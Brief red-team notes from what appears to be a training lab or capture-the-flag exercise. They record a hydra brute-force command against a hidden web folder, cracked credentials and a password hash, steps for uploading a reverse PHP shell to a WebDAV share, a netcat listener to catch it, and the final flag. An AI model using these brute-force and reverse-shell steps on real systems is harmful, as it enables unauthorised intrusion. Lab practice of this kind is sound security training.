# Project-2

Red Team
pstone IP : 192.168.1.105

Network :
Ubuntu
22 OpenSSH 7.6p1 4ubuntu0.3
80 Apache 2.4.29 Ubuntu

192.168.1.105/company_folders/secret_folder
---

hydra -l ashton -P rockyou.txt -s 80 -f -vV 192.168.1.105 http-get
/company_folders/secret_folder
Ashton :: leopoldo 

Connect to corp server
1. open folder on the left hand bar
2. click "Other Locations"
3. type "dav://172.16.84.205/webdav/"
4. use ryan and his pass (brute force)
5. upload reverse php script

ryan :: linux4u

ryan:$apr1$fsU/VibG$HznoQs6XTF7VauEHtktNt.

nc -lvnp 1234
click on reverse php file

flag: b1ng0w@5h1sn@m0
